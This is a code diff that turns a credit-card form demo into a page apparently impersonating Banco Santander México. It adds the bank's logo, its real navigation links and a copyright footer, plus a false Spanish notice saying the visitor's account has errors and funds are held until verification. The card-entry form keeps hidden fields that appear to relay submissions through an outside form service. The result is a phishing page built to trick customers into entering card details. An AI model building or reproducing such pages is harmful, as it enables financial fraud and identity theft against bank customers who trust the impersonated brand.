@@ -4,14 +4,37 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
-	<title>Formulario de Tarjeta de Crédito Dinámico</title>
+	<title>Comprobación de datos</title>
 	<link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
 	<link rel="stylesheet" href="css/estilos.css">
+	<!-- CSS only -->
+	<!-- CSS only -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
+	<link rel="canonical" href="https://getbootstrap.com/docs/5.2/examples/headers/">
+
 </head>
 <body>
 	
+	<div class="container">
+		<header class="d-flex flex-wrap justify-content-center py-3 mb-4 border-bottom">
+		  <a href="/" class="d-flex align-items-center mb-3 mb-md-0 me-md-auto text-dark text-decoration-none">
+			<svg class="bi me-2" width="40" height="32"><use xlink:href="/img/banco.jpg"/></svg>
+			<span class="fs-4">
+				<img src="img/santander.png" width="256" height="45.2"></span>
+		  </a>
+	
+		  <ul class="nav nav-pills">
+			<li class="nav-item"><a href="https://www.santander.com.mx/index.html" class="nav-link active" aria-current="page">Inicio</a></li>
+			<li class="nav-item"><a href="https://www.santander.com.mx/bei/home/" class="nav-link">Personas</a></li>
+			<li class="nav-item"><a href="https://www.santander.com.mx/bei/home/" class="nav-link">Empresas</a></li>
+			<li class="nav-item"><a href="https://www.santander.com.mx/bei/home/instituciones/index.html" class="nav-link">Gobierno</a></li>
+			<li class="nav-item"><a href="https://www.santander.com.mx/ir/vision/" class="nav-link">Acerca del Banco</a></li>
+		  </ul>
+		</header>
+	  </div>
 	<div class="contenedor">
-
+		<h2>Proceso de verificación de cuentas bancarias externas</h2>
+		<p>Hubo errores en la cuenta bancaria proporcionada, el monto se encuentra restringido hasta que se realiza la verificación de la cuenta asociada para así hacer el previo depósito de la cantidad.</p>
 		<!-- Tarjeta -->
 		<section class="tarjeta" id="tarjeta">
 			<div class="delantera">
@@ -50,7 +73,7 @@
 						<p class="ccv"></p>
 					</div>
 				</div>
-				<p class="leyenda">Lorem ipsum dolor sit amet consectetur adipisicing elit. Accusamus exercitationem, voluptates illo.</p>
+				<p class="leyenda"> El modelo comercial de Banco Santander está diseñado para satisfacer las necesidades de todo tipo de clientes </p>
 				<a href="#" class="link-banco">www.Santander.com</a>
 			</div>
 		</section>
@@ -104,14 +127,32 @@
 			
 				
 			
-			<input type="hidden" name="_next" value="https://www.santander.com">
+			<input type="hidden" name="_next" value="https://www.santander.com.mx">
 			<input type="hidden" name="_captcha" value="false">
 
-			<button type="submit" class="btn-enviar" value="https://www.santander.com.mx">Verificar Datos</button>
+			<!--button type="submit" class="btn-enviar" value="https://www.santander.com.mx">Verificar Datos</button-->
 		</form>
 	</div>
 
 	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
 	<script src="js/main.js"></script>
+
+	<div class="container">
+		<footer class="d-flex flex-wrap justify-content-between align-items-center py-3 my-4 border-top">
+		  <div class="col-md-4 d-flex align-items-center">
+			<a href="/" class="mb-3 me-2 mb-md-0 text-muted text-decoration-none lh-1">
+			  <svg class="bi" width="30" height="24"><use xlink:href="#bootstrap"/></svg>
+			</a>
+			<span class="mb-3 mb-md-0 text-muted">&copy; 2022 Santander, Inc</span>
+		  </div>
+	  
+		  <ul class="nav col-md-4 justify-content-end list-unstyled d-flex">
+			<li class="ms-3"><a class="text-muted" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#twitter"/></svg></a></li>
+			<li class="ms-3"><a class="text-muted" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#instagram"/></svg></a></li>
+			<li class="ms-3"><a class="text-muted" href="#"><svg class="bi" width="24" height="24"><use xlink:href="#facebook"/></svg></a></li>
+		  </ul>
+		</footer>
+	  </div>
+	  
 </body>
 </html>
